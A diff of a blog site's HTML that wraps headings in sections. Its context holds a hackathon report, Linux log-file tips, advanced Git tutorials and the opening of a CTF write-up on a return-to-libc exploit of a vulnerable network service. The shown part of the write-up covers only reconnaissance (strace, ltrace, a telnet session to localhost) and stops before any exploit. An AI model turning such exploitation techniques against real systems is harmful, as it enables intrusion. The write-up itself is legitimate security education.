@@ -38,47 +38,64 @@
       <div class="right">
 <img style="float:right" width="300" height="300" src="http://distilleryimage10.ak.instagram.com/b88daa3e38a911e3893622000a1fcd0b_7.jpg">
 </div>
-<h4 id="pm">3:30PM</h4>
+<section id="pm" class="level4">
+<h4>3:30PM</h4>
 <p>Ladies and gentleman, fast hackers and coder perfectionists, web developers and mobile app creators, we present you the first edition of the Facebook hackathon in Romania. Organized by your favorite open-source community ROSEdu, the volunteers have been busy all morning preparing the workspace for the 15 participating teams. We have pizza, beer and a mountain of bean bags for people who <em>move fast and break things</em>.</p>
 <div style="clear:both;">
 
 </div>
-<h4 id="pm-1">3:30PM</h4>
+</section>
+<section id="pm-1" class="level4">
+<h4>3:30PM</h4>
 <p>People have started their IDEs (or text editors for more hardcore people) and started installing their gems (Ruby guy here sorry). After a quick intro from the organizers about the rules, the Facebook engineers presented their skills and their expectations: it’s fun to code, but it’s awesome <strong>to ship</strong>. So happy shipping hackers!</p>
 <div class="center">
 <img width="600" height="400" src="https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-ash3/1381306_602864479775589_1298026562_n.jpg">
 </div>
-<h4 id="pm-2">5:30PM</h4>
+</section>
+<section id="pm-2" class="level4">
+<h4>5:30PM</h4>
 <p>A brief pause and all the keyboard presses have stopped. The Facebook representatives have given out a random prize! One Facebook T-shirt. Congratulations to Andrei Duma! People are now back to coding and making their ideas come to life: <strong>done is better than perfect</strong>.</p>
 <div class="center">
 <img width="600" height="400" src="/images/facebook-hackathon/premii_facebook.jpg">
 </div>
-<h4 id="first-team">First team</h4>
+</section>
+<section id="first-team" class="level4">
+<h4>First team</h4>
 <p>Only 4 hours in the event! We have interviewed some of the participants and they’re coding, designing and implementing their application basis! The first team we interviewed is <a href="https://github.com/rosedu/3_awesome_guyes_and_a_llama">3_awesome_guys_and_a_llama</a>. These students from the University “Politehnica” of Bucharest are writing an Event Planner. From what they told us, it’s an application which tries to help people organize events for them and their friends for their night out. It’s more focused on location, than being focused on time, so they can make it a planned drink-up or dance-off. They integrate it with the Facebook Places API and would like to have bars, clubs and restaurants use their app so people can make reservations. As technology stack, they have Python on top of Google App Engine. One of the devs said that he learned about it on a <a href="https://www.udacity.com/course/cs253">Udacity course</a> which I recommend it to you. They also plan to use Twitter’s Bootstrap library because they do not have enough frontend experience.</p>
 <div class="center">
 <img width="600" height="400" src="/images/facebook-hackathon/two_guys_llama.JPG">
 </div>
-<h4 id="be-green-recycle">Be green, recycle</h4>
+</section>
+<section id="be-green-recycle" class="level4">
+<h4>Be green, recycle</h4>
 <p>You are a human, walking down and you see a big pile of garbage. It’s a scenario common here in Romania. But what if you have an app for cleaning it? That’s what <a href="https://github.com/rosedu/sudoRecycle">sudoRecycle</a> is trying to do with their Android idea. You see the junk, take a photo, tag it with the GPS location and send it to their servers. Using their backend written in PHP, they will send teams of robots that will clean the area. Because we human beings are really lazy, they plan to use the Facebook API for gamification, so you could level up in cleaning the world.</p>
 <div class="center">
 <img width="600" height="400" src="/images/facebook-hackathon/sudo_recycle.JPG">
 </div>
-<h4 id="explore-the-underground">Explore the underground</h4>
+</section>
+<section id="explore-the-underground" class="level4">
+<h4>Explore the underground</h4>
 <p>We’ve all endured the lack of knowledge of moving around Bucharest, if we haven’t lived here. But <a href="https://github.com/rosedu/Dark_side_of_the_moon">dark_side_of_the_moon</a> is going to remedy this with their offline mobile subway connection app. You want to get from X to Y using the shortest route. It also wants to tell you what ground-level public transportation is there and what you can visit. Furthermore they want it to tell your friends where you’ve been after you used its functionality to check-in at your destination. Under the hood, it’s using Android 4.0+ API and they want to integrate with the Facebook API to see the places your friends have visited. The coolest feature they want to code will tell you when the next tube will arrive.</p>
 <div class="center">
 <img width="600" height="400" src="/images/facebook-hackathon/pink_floyd.jpg">
 </div>
-<h4 id="grails">GRails</h4>
+</section>
+<section id="grails" class="level4">
+<h4>GRails</h4>
 <p>Did you know that in the year 2013, if you apply to MIT, you must send the papers by fax or postal mail? And after you send them, a person will manually go through them and tell you that the papers have arrived? Or if you get into a university you must write 6 papers with about 60% redundant information? That’s what <a href="https://github.com/rosedu/GRails">GRails</a>, the only team made entirely of girls, is trying to solve, fighting bureaucracy with Rails 4. Now with 100% less paper involved!</p>
 <div class="center">
 <img width="600" height="400" src="/images/facebook-hackathon/grails.jpg">
 </div>
-<h4 id="hiking">Hiking</h4>
+</section>
+<section id="hiking" class="level4">
+<h4>Hiking</h4>
 <p>Everybody knows that Romania has some of the best hiking routes, beautiful views and mysterious mountains. And who doesn’t want to know what trips you can make in the wild nature? Well, you can now check out a map and see what is available for adventurers! The map also shows you elevation, so you know if it’s a long road and also an abrupt road. A Django platform by <a href="https://github.com/rosedu/saltaretii">saltaretii</a> should be enough to support this paradise for nature’s explorers!</p>
 <div class="center">
 <img width="600" height="400" src="/images/facebook-hackathon/saltaretii.jpg">
 </div>
-<h4 id="i-want-to-ride-my-bicycle-i-want-to-ride-my-bike">I want to ride my bicycle, I want to ride my bike</h4>
+</section>
+<section id="i-want-to-ride-my-bicycle-i-want-to-ride-my-bike" class="level4">
+<h4>I want to ride my bicycle, I want to ride my bike</h4>
 <p>2 wheels, foot power and long distance travelling made easy! These two guys are achieving the awesome tool that brings bikers a dream app come true! Using complex algorithms, they want to give bikers many possible routes from one place to another. You can choose your own type of road, either abrupt and short or longer and less steep. The point? You can choose which kind of road you want and which is fit for you! If that is not enough, these 2 guys are doing this client side with ClojureScript… yeah, it’s the new functional kid in town which tries to solve the event driven callback hell. <a href="https://github.com/rosedu/flatride">FlatRide</a> on, people!</p>
 <div class="center">
 <img width="600" height="400" src="/images/facebook-hackathon/flatride.jpg">
@@ -86,14 +103,14 @@
 <div class="right">
 <img src="/images/facebook-hackathon/jackson.jpg">
 </div>
-<h4 id="jackson-gabbard"><a href="https://www.facebook.com/jg">Jackson Gabbard</a></h4>
+</section>
+<section id="jackson-gabbard" class="level4">
+<h4><a href="https://www.facebook.com/jg">Jackson Gabbard</a></h4>
 <p>From an English major in Tennessee, to the 300th Facebook employee, to the 4th one to move in the new London office. He works on developer tools for the engineers and oversees some of the most important components like <em>Tasks</em> which devs open daily to get their job done. He is a self-taught hacker and he had an enlightment moment about the power of programming the first time he used the array structure.</p>
 <p>He was really communicative and willing to tell us of his opinions, about the event, mentioning that he’s amazed about the main focus of students. ‘Transportation’, ‘Finding things’ and ‘Group organization’ are recurrent themes. He said some of his coworkers are Romanian and he thinks Romania is a land where lots of engineers are being created. Proud to be a full-time hackers around here!</p>
 <p>We also asked him about the Bootcamp in London, which is about learning to code. And guess what? Even executives go through these preparations to get into Facebook. The engineering team has lots of fun hacking in that period of education. It teaches you how to love the company, you get to learn the ropes while communicating and interact with other mind-like people.</p>
 <p>Finally he has participated in lockdowns each year. These are periods of time when teams gather in a room and stay there for several days (usually 30) and ship a big feature. Pretty hardcore, but that’s life at Facebook.</p>
-<div style="clear:both;">
-
-</div>
+</section>
 
     </div>
   </div>
@@ -131,24 +148,30 @@
       </span>
 
       <p>Here are are some small things you might find useful when you need to deal with text files. In the Linux/Unix world, a lot of things are text files, so you need to know how to efficiently handle them. If you are a sysadmin, you need to look at <strong>log files</strong> for most of your work time and the following might come in handy.</p>
-<h3 id="following-a-log-file">Following a log file</h3>
+<section id="following-a-log-file" class="level3">
+<h3>Following a log file</h3>
 <p>Take your <code>$GENERIC_SERVICE</code> on your server that generates a lot of logs. You could open a <strong>text editor</strong> like <code>vi</code> or <code>emacs</code> to view the logs or use <code>tail</code> to see the latest lines (or a combination of tail and <code>head</code>). But you sometimes you need to view contents of the log in real time (while the service writes the lines, you read them). This is where the best use for the tail command comes in: the <code>--follow</code> flag.</p>
 <pre><code>tail -f /var/log/mylog</code></pre>
 <p>Tail usually creates a process that prints a few lines (the lines that exist when you run it), but with the <code>-f</code> flag, the tail process keeps running and prints new lines as the file is being appended. The process will close when the uses issues the <code>Cltr-D</code> (end of file) command.</p>
-<h3 id="truncating-a-file">Truncating a file</h3>
+</section>
+<section id="truncating-a-file" class="level3">
+<h3>Truncating a file</h3>
 <p>Maybe you need to clear the contents of a log file that has gotten too big. You could do a <code>rm</code> on the file and let the service write the new logs in a new file. Some services are picky and need the file to already exist, so you could use the <code>touch</code> command (that “updates” an existing file) which has the interesting side effect when applied on a non existing file: to create an empty file (a new inode with no data blocks).</p>
 <p>But you just want to empty a file (same inode, just the contents cleared). You could use the <code>truncate</code> command with the size flag of 0 bytes (<code>-s 0</code>). Or make use of the redirect operator <code>&gt;</code>.</p>
 <pre><code>:&gt;file</code></pre>
 <p>or just</p>
 <pre><code>&gt;file</code></pre>
 <p>These will open the file, and redirect nothing into it. Since it is not appending anything, the contents will be erased. <code>:</code> is the no-op command so nothing will actually be done, but the shell with open and write (well … nothing) into the file because of the redirection operator <code>&gt;</code>.</p>
-<h3 id="one-input-two-outputs">One input, two outputs</h3>
+</section>
+<section id="one-input-two-outputs" class="level3">
+<h3>One input, two outputs</h3>
 <p>Some programs do not have a logging system programmed into them and just print messages to standard output. Maybe you want to save that output into a file for future use. This is simple to do with a file redirection:</p>
 <pre><code>./myprogram &gt; my_log_file</code></pre>
 <p>But if you do this, you will lose the output to the (virtual) terminal. A very interesting command is <code>tee</code>, that takes an input and writes to standard output, but also writes into a specified file. You need to pipe the output of a process into tee like this:</p>
 <pre><code>./myprogram | tee my_log_file</code></pre>
 <p>Now you have both real time printing of the messages and you have them saved for future use.</p>
 <p>Hope this helps!</p>
+</section>
 
     </div>
   </div>
@@ -186,7 +209,8 @@
       </span>
 
       <p>Finally, the third article on advanced <a href="http://git-scm.com/" title="Git">git</a> topics will focus on things that many will use only in some very special cases.</p>
-<h2 id="handling-multiple-remotes">Handling Multiple Remotes</h2>
+<section id="handling-multiple-remotes" class="level2">
+<h2>Handling Multiple Remotes</h2>
 <p>There are situations when you decide to use multiple remotes for a repository. For example, I’m using multiple remotes for my snippets repository:</p>
 <pre><code>razvan@einherjar:~/code$ git remote show
 gh
@@ -240,7 +264,9 @@ To git@github.com:razvand/site.git
    6f3dd4d..7411020  master -&gt; master</code></pre>
 <p>New local changes are then going to be pushed to the <code>origin</code> remote. These changes are then going to be aggregated into pull requests for the <code>upstream</code> remote (the main repository), now in sync with the forked repository.</p>
 <p>The above is a specific use case for syncing a fork in GitHub, making use of two remotes: one for the original reposotiry and one for the fork. The <a href="https://help.github.com/articles/syncing-a-fork" title="Syncing a fork">excellent GitHub article</a> thoroughly describes the steps you need to undertake to sync your fork.</p>
-<h2 id="bisecting-the-history">Bisecting the History</h2>
+</section>
+<section id="bisecting-the-history" class="level2">
+<h2>Bisecting the History</h2>
 <p>A powerful feature of Git is its ability to quickly find out a commit which introduced a bad change. Suppose you have a bug in your application:</p>
 <pre><code>$ ./test_math.py 
 2 + 3 = 6</code></pre>
@@ -311,7 +337,9 @@ Date:   Sat Mar 9 00:24:43 2013 +0200
 
 bisect run success</code></pre>
 <p>This is indeed a good tool to have in Git’s toolbox.</p>
-<h2 id="stashing-the-goodies">Stashing the Goodies</h2>
+</section>
+<section id="stashing-the-goodies" class="level2">
+<h2>Stashing the Goodies</h2>
 <p>It often happens that you’ve done some changes that you don’t want to commit yet but you need to sync with the remote repository (i.e. do a pull). Or you want to merge a branch without commiting your changes. In this case, the solution is using the stash.</p>
 <p>The stash is a special place for Git where you temporarily stash your changes in order to keep your repository clean:</p>
 <pre><code>razvan@einherjar:~/projects/rosedu/site/site.git$ git status
@@ -341,7 +369,9 @@ no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&q
 Dropped refs/stash@{0} (940f594b5f93e616dc16285e0677fbc78aa33620)</code></pre>
 <p>The moment you stash changes, they “disappear” from the working directory. You will be able to get them by using <code>git stash pop</code>.</p>
 <p>When multiple users are working on a given repository it will often happen that you need to pull their updates to see what has been done. Your local copy may have changes you’ve made yourself, but still far from a commit. In that case you would stash your changes, pull remote updates to sync your repository and then pop the stash to continue your work.</p>
-<h2 id="a-reference-for-everything">A Reference For Everything</h2>
+</section>
+<section id="a-reference-for-everything" class="level2">
+<h2>A Reference For Everything</h2>
 <p>We are near the end of the series. You have learned several things and you might try others as well. Yet, from time to time you may find out that you have lost a commit while playing around. Or, you rebased somewhere in the past but you need a commit which you had skipped. Or, you used <code>git reset --hard</code> and threw out a needed commit.</p>
 <p>Luckily for you, Git doesn’t lose anything. Everything can be recovered by using a nice feature called <em>reflog</em> (from <em>reference log</em>). Let’s see it in action first.</p>
 <pre><code>$ git reflog
@@ -354,7 +384,9 @@ f020807 HEAD@{3}: commit: Ready to publish «Git is the answer - part 2» articl
 97b6f11 HEAD@{6}: commit: Add TODO for conclusions.</code></pre>
 <p>The first column lists the commit hash at the point where the reference points to. The second is the state of <code>HEAD</code> (<code>HEAD{1}</code> is where <code>HEAD</code> previously was and so on). Then, you have a short description of what the reference is about (a commit, a checkout, a merge, a reset, etc.). This helps you in remembering what each change was about.</p>
 <p>To recover a commit you just cherry pick it from the reflog using its hash or even the <code>HEAD@{id}</code> reference.</p>
-<h2 id="garbage-collecting-the-repository">Garbage Collecting the Repository</h2>
+</section>
+<section id="garbage-collecting-the-repository" class="level2">
+<h2>Garbage Collecting the Repository</h2>
 <p>In the end, let’s focus on trimming down the disk usage of the repository. We want to prune some references. First, we set an expire date:</p>
 <pre><code>$ git reflog expire --expire=1.day refs/head/master</code></pre>
 <p>The above marks all references older than 1 day as being obsolete.</p>
@@ -404,9 +436,12 @@ c0a692b refs/remotes/gh/master@{4}: pull --rebase: fast-forward
 745963b refs/remotes/gh/master@{6}: pull --rebase: fast-forward
 fd23db9</code></pre>
 <p>The last line shows the id of one commit but nothing more related to it. You can still reset/rebase to there but you cannot point to any reference past it.</p>
-<h2 id="closing-up">Closing Up</h2>
+</section>
+<section id="closing-up" class="level2">
+<h2>Closing Up</h2>
 <p>We are at the close of this three part article on advanced git usage. Some of the things presented here might make you ask <em>when I’ll be using that?</em>. Some of them will prove useful from time to time while others are a good thing to know.</p>
 <p>In the end, remember that Git is a swiss army knife among VCSs and there are a lot of features which will make us masters of it should we learn and practice using them. Like Vim, above a certain threshold Git can only be learnt by using it on a day to day basis.</p>
+</section>
 
     </div>
   </div>
@@ -444,7 +479,8 @@ fd23db9</code></pre>
       </span>
 
       <p>The second article on advanced <a href="http://git-scm.com/" title="Git">git</a> topics is focused on cases where multiple branches are involved.</p>
-<h2 id="my-changes-conflict-with-yours">My Changes Conflict With Yours</h2>
+<section id="my-changes-conflict-with-yours" class="level2">
+<h2>My Changes Conflict With Yours</h2>
 <p>Usually, it happens that two developers are working on the same file. Git tries its best to merge changesets from both developers without complaining. However, Git is not a human being so it cannot know what change is the good ones when two changes happen two close to one another in the file.</p>
 <p>As opposed to SVN, in Git, it is the responsibility of the one who pulls to solve conflicts. Thus, you are forced to solve conflicts before being able to push your changes upstream. But how does it work?</p>
 <p>When you try to pull a file which contains conflicting changes, git will stop with a strange message. We will use the <code>git pull --rebase</code> command instead of the <code>git pull</code>.</p>
@@ -476,7 +512,9 @@ I don&#39;t like this line 5
 git rebase --continue</code></pre>
 <p>If there are more conflicting changes you will have to reapply the same procedure. Otherwise, you can go forward to pushing your changes. As you can see, no conflict ever leaves your repository, you are forced to deal with it before continuing.</p>
 <p><strong>Note</strong>: Remember to solve all conflicts in the same file before continuing the rebase process. Otherwise artifacts will be committed. (this is an edit suggested via comments by Stefan Bucur).</p>
-<h2 id="tags-and-branches-for-the-win">Tags and Branches For The Win</h2>
+</section>
+<section id="tags-and-branches-for-the-win" class="level2">
+<h2>Tags and Branches For The Win</h2>
 <p>Tags are the best way to keep references to old commits. They are particularly helpful in school related activities, where you update lectures and lab tasks on an yearly basis.</p>
 <p>The right way to handle this is to create a tag at the end of each year and update labs and tasks. If at any time you want to check out the old curriculum you can get back to that tag.</p>
 <p>For example, for the <a href="http://elf.cs.pub.ro/saisp/" title="SAISP">SAISP</a> repository, we’ve created tag a tag at the end of each year of study:</p>
@@ -530,7 +568,9 @@ razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
 Makefile  curs1  curs3  git.mm  git_tutorial  schelet_inscriere  template  util
 razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git commit -m &#39;Clear folder structure. Leave only current items&#39;</code></pre>
 <p>All is now nice and clear. Any updates are going to be done on the current folder structure; any request to see old data can be handled by checking out one of the branches.</p>
-<h2 id="branches-on-a-virtual-machine">Branches on a Virtual Machine</h2>
+</section>
+<section id="branches-on-a-virtual-machine" class="level2">
+<h2>Branches on a Virtual Machine</h2>
 <p>In our experience we come to situations when required to work on the desktop/laptop and on a virtual machine. Of course, we are using Git for storing code. It would only make sense for one repository to be a remote for another one. The case is that, with Git, every repository can be a remote.</p>
 <p>As such, I usually create a clone of the laptop repository on the virtual machine. I usually do that with the <a href="http://ocw.cs.pub.ro/courses/so2/" title="SO2">SO2</a> repository when updating lab tasks or assignment solutions and tests. The laptop stores the main repository and the virtual machine uses a clone of that:</p>
 <pre><code>root@spook:~# git clone razvan@einherjar.local:school/current/so2/git-repos/lab lab.git
@@ -553,7 +593,9 @@ To razvan@einherjar.local:school/current/so2/git-repos/lab
 First, rewinding head to replay your work on top of it...
 Fast-forwarded master to vm.</code></pre>
 <p>At this moment, all changes in the repository clone on the virtual machine are present in the master branch on the repository on the laptop. You need to create a separate branch on the virtual machine clone and then push that branch to the main repository. If you would work on the master branch on the virtual machine clone and push that, it would be problematic to integrate those changes in the master branch on the main repository.</p>
-<h2 id="going-after-cherries">Going After Cherries</h2>
+</section>
+<section id="going-after-cherries" class="level2">
+<h2>Going After Cherries</h2>
 <p>In some cases, when working with multiple branches, it might happen that you need a specific commit from one branch but you don’t want to merge that branch into your current one.</p>
 <p>Fortunately, Git allows you to pick a single commit as easy as picking cherries from a cherry-tree. In fact, the command is <code>git cherry-pick</code>.</p>
 <pre><code>$ git cherry-pick 1904c3d4c9720
@@ -570,6 +612,7 @@ Date:   Fri Mar 8 23:59:07 2013 +0200
     File to be cherry-picked in master.</code></pre>
 <p>As you can see, the commit hash is different meaning that there is a new commit, not the old one.</p>
 <p>Should a commit not apply cleanly, Git stops the cherry-picking process and asks for human intervention. After the problems are resolved, you can continue it with <code>git cherry-pick --continue</code>. Or, you can abort it via <code>--abort</code> if you change your mind after seeing the trouble.</p>
+</section>
 
     </div>
   </div>
@@ -607,7 +650,8 @@ Date:   Fri Mar 8 23:59:07 2013 +0200
       </span>
 
       <p>We focus again on <a href="http://git-scm.com/" title="Git">git</a>. This time, we will present some real-world scenarios where knoweldge of advance git topics helps. In order to keep down the length of the article, our presentation is divided in 3 parts, this being the first one of these.</p>
-<h2 id="user-setup">User Setup</h2>
+<section id="user-setup" class="level2">
+<h2>User Setup</h2>
 <p>After installing Git and before doing any commits into a repository, you must setup your user information and preferences. It is common to make a global configuration, using <code>git config</code>:</p>
 <pre><code>git config --global user.name &quot;Razvan Deaconescu&quot;
 git config --global user.email &quot;razvan.deaconescu@cs.pub.ro&quot;
@@ -619,7 +663,9 @@ git config --global color.ui auto</code></pre>
 git config user.email &quot;razvan@rosedu.org&quot;</code></pre>
 <p>In the above setup, I have only updated the email address for the repository. The other options used are picked from the global configuration.</p>
 <p>Per repository configuration is stored in <code>/path/to/repository.git/.config</code>.</p>
-<h2 id="handling-line-endings-like-a-pro">Handling Line Endings Like a Pro</h2>
+</section>
+<section id="handling-line-endings-like-a-pro" class="level2">
+<h2>Handling Line Endings Like a Pro</h2>
 <p>From time to time it is possible that you will have to work with people working on a different operating system. It is no problem if both of you are using systems with similar line-endings (<code>CRLF</code> for Windows, <code>LF</code> for Linux/OSX). In all other cases, it might be that the default Git options used for this don’t work for you.</p>
 <p>You can configure Git globally to handle line-endings if you set the <code>core.autocrlf</code> option in your <code>~/.gitconfig</code>. However, the best settings are different on different platforms.</p>
 <p>For Windows you would use</p>
@@ -643,7 +689,9 @@ git reset --hard</code></pre>
 <pre><code>git add .
 git commit -m &quot;Normalized line endings&quot;</code></pre>
 <p>From now on, Git will properly do the job of handling line endings for you.</p>
-<h2 id="how-to-create-and-setup-a-local-repo">How to Create and Setup a Local Repo</h2>
+</section>
+<section id="how-to-create-and-setup-a-local-repo" class="level2">
+<h2>How to Create and Setup a Local Repo</h2>
 <p>One of the best features of Git is the ability to rapidly create and use local repositories. You don’t have to create a repository and then clone it locally as you do in Subversion. You just create or access a directory and then initialize it as a Git repository. Changes to files in the directory will be able to be handled as commits.</p>
 <p>Assuming I am working on a personal project, the first thing I would do is create a directory and initialize it as a Git repository. I recommend you append the <code>.git</code> extension:</p>
 <pre><code>mkdir ~/projects/troscot.git
@@ -664,7 +712,9 @@ git add .
 git status
 git commit -m &#39;Initial commit. Add all config files to repository&#39;</code></pre>
 <p>The above commands add a <code>.gitignore</code> file in the repository and then add all Apache2 configuration files. The <code>git status</code> command is always necessary after a <code>git add</code> command to make sure you are committing the right stuff; you may need to update your <code>.gitignore</code> file in case you’ve missed ignoring certain types of files.</p>
-<h2 id="i-want-to-tweak-a-commit">I Want To Tweak A Commit</h2>
+</section>
+<section id="i-want-to-tweak-a-commit" class="level2">
+<h2>I Want To Tweak A Commit</h2>
 <p>From time to time you realize that you have made something wrong with a commit. Either you forgot to add a good, descriptive <a href="http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html" title="A Note About Git Commit Messages">message</a> or you have really screwed up some parts of the committed code. Maybe you have some compile errors to fix or your commit does too many things at once.</p>
 <p>Anyway, for all of these cases, Git allows you to rewrite the commit at will. You can add changes of tweak metadata (author name, commit message, etc.) just by issuing the needed commands and ending with</p>
 <pre><code>git commit --amend</code></pre>
@@ -708,7 +758,9 @@ Once you are satisfied with your changes, run
 <p>Now, you can add or remove content, change the commit as you want, etc. Then, you continue the rebase process by running <code>git commit --amend</code> followed by <code>git rebase --continue</code>. Both of them are needed.</p>
 <p>If you decide that the commit is ok and that the rebase was not neeeded, you can always abort it with <code>git rebase --abort</code>.</p>
 <p>Finally, keep in mind that <strong>it is not recommended to change commits once they have been pushed to another repository.</strong></p>
-<h2 id="but-my-commit-is-too-big">But My Commit Is Too Big</h2>
+</section>
+<section id="but-my-commit-is-too-big" class="level2">
+<h2>But My Commit Is Too Big</h2>
 <p>From time to time, you will have some big changes to commit. However, the case when all of them are atomic and cannot be split into several shorter components is very rare. Let’s take for our example a LaTeX Beamer file. You can commit each section separately or even each slide, as you see fit. But how can you split the commit?</p>
 <p>Actually, you can use two commands for this. One is <code>git add -i</code> to allow interactive adding of parts of commits. The second one is to use <code>git add -p</code> which is more simpler.</p>
 <p>Running <code>git add -p</code> will present you with the first chunk of changes to be committed. It might be the case that this is chunk is atomic or not. Git offers this question after presenting the hunk:</p>
@@ -741,7 +793,9 @@ e - manually edit the current hunk
 # then the edit is aborted and the hunk is left unchanged.</code></pre>
 <p>The <code>-</code> lines are lines which will be removed by the commit and the <code>+</code> ones will be added. Thus, if you remove a <code>+</code> line, the commit will not contain the addition and if you mark one <code>-</code> line as context it won’t be removed by the commit.</p>
 <p>Since <code>git add -p</code> is a powerful feature, it is advisable to have it added as an alias, via <code>git config</code>. For example, I have <code>git gap</code> do the same thing as <code>git alias -p</code>. Then, it is in my muscles’ memory to type <code>git gap</code> when adding changes for a new commit.</p>
-<h2 id="i-dont-want-this-commit-anymore">I Don’t Want This Commit Anymore</h2>
+</section>
+<section id="i-dont-want-this-commit-anymore" class="level2">
+<h2>I Don’t Want This Commit Anymore</h2>
 <p>There is often the case that you want to rollback a change you’ve done. As long as everything is happening locally (i.e. you haven’t pushed to a remote repository), Git offers the proper tools to handle this.</p>
 <p>Assume you’ve updated a file but you want to discard those changes. You’ve just done some tests and feel those are not required and want to get back to the initial version. Then you would issue</p>
 <pre><code>git checkout file-name</code></pre>
@@ -754,7 +808,9 @@ e - manually edit the current hunk
 <p>Consider that you’ve done some bad commits and you’ve just found out. The last two commits are really bad and need to be dropped. As long as you haven’t pushed anything, you can rework those commits: you can reset the repository HEAD and leave the commit changes in the working directory. If we want to redo the last two commits we would just issue:</p>
 <pre><code>git reset HEAD^^</code></pre>
 <p>Remember, this doesn’t remove the commit changes. The repository HEAD is simply moved back and the commit changes are left in the working directory; you will then use them to create proper new commits.</p>
-<h2 id="i-want-to-change-this-file-silently">I Want To Change This File Silently</h2>
+</section>
+<section id="i-want-to-change-this-file-silently" class="level2">
+<h2>I Want To Change This File Silently</h2>
 <p>GitHub has an excellent article on <a href="https://help.github.com/articles/ignoring-files" title="GitHub: Ignoring files">ignoring files</a>. A particular situation is ignoring updates to files that are already in the repository (i.e. they’ve been previously commited and can’t be ignored using .gitignore).</p>
 <p>This kind of situation is part of my repository with letters of recommendation. I’m using a Makefile for compiling out a letter and have isolated in it some variables:</p>
 <pre><code>$ cat Makefile
@@ -768,6 +824,7 @@ include base.mk</code></pre>
 <p>No changes on the <code>Makefile</code> file are going to be considered in the working directory.</p>
 <p>If you want to revert this option, use:</p>
 <pre><code>git update-index --no-assume-unchanged Makefile</code></pre>
+</section>
 
     </div>
   </div>
@@ -804,9 +861,12 @@ include base.mk</code></pre>
         <span class="tags"><a href="/tags/exploit.html">exploit</a>, <a href="/tags/ctf.html">ctf</a>, <a href="/tags/return-to-libc.html">return-to-libc</a>, <a href="/tags/strace.html">strace</a>, <a href="/tags/debugging.html">debugging</a>, <a href="/tags/gdb.html">gdb</a>, <a href="/tags/write-up.html">write-up</a></span>
       </span>
 
-      <h1 id="introduction">Introduction</h1>
+      <section id="introduction" class="level1">
+<h1>Introduction</h1>
 <p>This is a write-up for Pwnable 250 level from <a href="http://ghostintheshellcode.com/" title="Ghost in the Shellcode CTF">Ghost in the Shellcode</a> capture the flag competition. Basically a return-to-libc attack will be described; we will also describe the steps for solving the mentioned CTF level using the <a href="res/back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f" title="Vulnerable binary">original binary</a> from the competition.</p>
-<h1 id="hello-binary">Hello binary!</h1>
+</section>
+<section id="hello-binary" class="level1">
+<h1>Hello binary!</h1>
 <p>Let’s start by inspecting the binary.</p>
 <ul>
 <li><p>32bit dynamically linked binary</p>
@@ -821,62 +881,65 @@ listen(3, 20)                           = 0
 accept(3, </code></pre></li>
 </ul>
 <p><code>SO_REUSEADDR</code> is used, just for <em>easy</em> debugging ;-) - it allows other sockets to <code>bind()</code> this port; no more getting the annoying error <em>Address already in use</em> after the server crashes.</p>
-<pre><code>	$ telnet localhost 31337
-	Trying ::1...
-	Trying 127.0.0.1...
-	Connected to localhost.
-	Escape character is &#39;^]&#39;.
-	Connection closed by foreign host.
-	$</code></pre>
+<pre><code>$ telnet localhost 31337
+Trying ::1...
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is &#39;^]&#39;.
+Connection closed by foreign host.
+$</code></pre>
 <p>It immediately drops connection.</p>
 <p>Let’s have a look at what happens when we are connecting to it.</p>
-<pre><code>	$ ltrace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-	[...]
-	[pid 4359] accept(3, 0, 0, 0x697a0002, 1)                                           = 4
-	[pid 4359] fork()                                                                   = 4361
-	[pid 4359] close(4)                                                                 = 0
-	[pid 4359] accept(3, 0, 0, 0x697a0002, 1 &lt;unfinished ...&gt;
-	[pid 4361] &lt;... fork resumed&gt; )                                                     = 0
-	[pid 4361] getpwnam(&quot;back2skool&quot;)                                                   = NULL
-	[pid 4361] err(-1, 0x804997b, 0x80499b8, 0, 0back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f:
-	Failed to find user back2skool: Success
-	 &lt;unfinished ...&gt;
-	[pid 4361] +++ exited (status 255) +++</code></pre>
+<pre><code>$ ltrace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
+[...]
+[pid 4359] accept(3, 0, 0, 0x697a0002, 1)                                           = 4
+[pid 4359] fork()                                                                   = 4361
+[pid 4359] close(4)                                                                 = 0
+[pid 4359] accept(3, 0, 0, 0x697a0002, 1 &lt;unfinished ...&gt;
+[pid 4361] &lt;... fork resumed&gt; )                                                     = 0
+[pid 4361] getpwnam(&quot;back2skool&quot;)                                                   = NULL
+[pid 4361] err(-1, 0x804997b, 0x80499b8, 0, 0back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f:
+Failed to find user back2skool: Success
+ &lt;unfinished ...&gt;
+[pid 4361] +++ exited (status 255) +++</code></pre>
 <p>In short, <code>getpwnam</code> fails, and the forked child exits. It also prints a conclusive error - the user <code>back2skool</code> is required.</p>
 <p>Usually, the <em>first</em> step, when trying to solve a remote challenge is to debug it locally. Of course this is possible as long as we can run the application ourselves.</p>
 <p>After we setup the user we can see the following output when connecting:</p>
-<pre><code>	$ telnet localhost 31337
-	Trying ::1...
-	Trying 127.0.0.1...
-	Connected to localhost.
-	Escape character is &#39;^]&#39;.
-	    __  ___      __  __   _____
-	   /  |/  /___ _/ /_/ /_ / ___/___  ______   __ v0.01
-	  / /|_/ / __ `/ __/ __ \\__ \/ _ \/ ___/ | / /
-	 / /  / / /_/ / /_/ / / /__/ /  __/ /   | |/ /
-	/_/  /_/\__,_/\__/_/ /_/____/\___/_/    |___/
-	===============================================
-	Welcome to MathServ! The one-stop shop for all your arithmetic needs.
-	This program was written by a team of fresh CS graduates using only the most
-	agile of spiraling waterfall development methods, so rest assured there are
-	no bugs here!
-	
-	Your current workspace is comprised of a 10-element table initialized as:
-	{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
-	
-	Commands:
-		read	Read value from given index in table
-		write	Write value to given index in table
-		func1	Change operation to addition
-		func2	Change operation to multiplication
-		math	Perform math operation on table
-		exit	Quit and disconnect
-	exit
-	Exiting program!
-	Connection closed by foreign host.
-	$</code></pre>
-<h1 id="the-vulnerability">The vulnerability</h1>
-<h4 id="high-level">High-level</h4>
+<pre><code>$ telnet localhost 31337
